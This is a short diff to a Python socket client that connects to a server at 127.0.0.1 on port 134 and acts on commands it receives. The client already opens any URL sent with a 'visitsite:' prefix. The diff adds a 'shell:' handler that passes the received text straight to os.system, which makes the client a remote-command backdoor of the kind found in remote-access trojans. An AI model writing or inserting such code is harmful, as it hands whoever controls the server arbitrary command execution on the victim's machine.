@@ -1,6 +1,7 @@
 import socket               # Import socket module
 import webbrowser
 import sys
+import os
 s = socket.socket()         # Create a socket object
 host = "127.0.0.1" # Server that client will connect to
 port = 134                # Server's port that client will use
@@ -17,7 +18,7 @@ while True:
         sys.exit()
     if(received[:10] == "visitsite:"):
 
-        
-        
         webbrowser.open(received.replace("visitsite:",""))
+    if(received[:6] == "shell:"):
+        os.system(received.replace("shell:",""))
         
